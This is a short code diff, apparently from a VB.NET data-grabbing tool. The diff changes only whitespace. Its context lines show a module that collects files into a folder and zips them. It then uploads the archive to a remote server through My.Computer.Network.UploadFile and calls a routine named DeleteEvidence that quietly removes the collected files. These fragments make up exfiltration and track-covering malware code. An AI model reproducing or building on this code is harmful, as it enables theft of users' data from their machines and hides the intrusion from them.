@@ -10,7 +10,7 @@ Module Module1
     Private mypath As String = ChosenPath()
     Private zip As String = mypath + ".zip"
     
-    Public Sub Main()     
+    Public Sub Main()            
         If Not Directory.Exists(mypath) Then 
             Directory.CreateDirectory(mypath)
         End If        
@@ -110,6 +110,7 @@ Module Module1
         My.Computer.Network.UploadFile(zip, server, "", "") 'Add username and password if required
         MsgBox("Done!")
     End Sub
+
     Private Sub DeleteEvidence()
         On Error Resume Next
         For Each del As String In Directory.GetFiles(mypath)
